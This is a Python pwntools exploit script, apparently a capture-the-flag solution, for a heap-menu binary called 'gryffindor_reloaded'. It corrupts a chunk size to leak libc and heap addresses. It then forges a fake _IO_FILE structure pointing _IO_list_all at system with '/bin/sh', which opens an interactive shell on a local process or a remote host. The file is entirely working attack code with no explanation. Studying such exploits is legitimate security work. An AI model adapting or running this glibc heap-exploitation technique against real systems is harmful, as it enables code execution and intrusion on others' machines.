from pwn import *

prompt = '>> '


def add(idx, size):
    p.sendlineafter(prompt, '1')
    p.sendlineafter('input\n', str(size))
    p.sendlineafter('index\n', str(idx))


def edit(idx, size, payload):
    p.sendlineafter(prompt, '3')
    p.sendlineafter('index\n', str(idx))
    p.sendlineafter('size\n', str(size))
    if len(payload) < size:
        payload += '\n'
    p.send(payload)


if __name__ == '__main__':
    if sys.argv[1] == 'local':
        p = process('./gryffindor_reloaded', env={'LD_PRELOAD': './libc.so.6'})
    else:
        p = remote('35.196.60.11', 31337)
    libc = ELF('./libc.so.6')
    add(0, 0x400-16)
    payload = fit({0x400-8: p64(0xc01)})
    edit(0, 0x408, payload)
    add(1, 0x1000)
    add(2, 8)
    edit(2, 8, 'A'*8)
    p.recvuntil('A'*8)
    libc.address = u64(p.recv(6).ljust(8, '\x00')) - 0x3c5158
    io_list_all = libc.symbols['_IO_list_all']
    system = libc.symbols['system']
    log.success("Libc leak @ {}".format(hex(libc.address)))
    log.success("_IO_list_all => {}".format(hex(io_list_all)))
    log.success("System => {}".format(hex(system)))
    edit(2, 17, 'A'*17)
    p.recvuntil('A'*17)
    heap = u64(('\x00'+p.recv(5)).ljust(8, '\x00')) + 0x20
    log.success("Leaked heap @ {}".format(hex(heap)))
    junk = "A"*16
    payload = fit({0: '/bin/sh\x00'+p64(0x61),
                   0x18: p64(io_list_all-0x10),
                   0x78: p64(system),
                   0xa0: p64(heap+0x90)+p64(2)+p64(3),
                   0xc0: p64(1),
                   0xd8: p64(heap+0x60)})
    edit(2, 0x100, junk+payload)
    p.sendlineafter(prompt, '1')
    p.sendlineafter('input\n', '10')
    p.interactive()
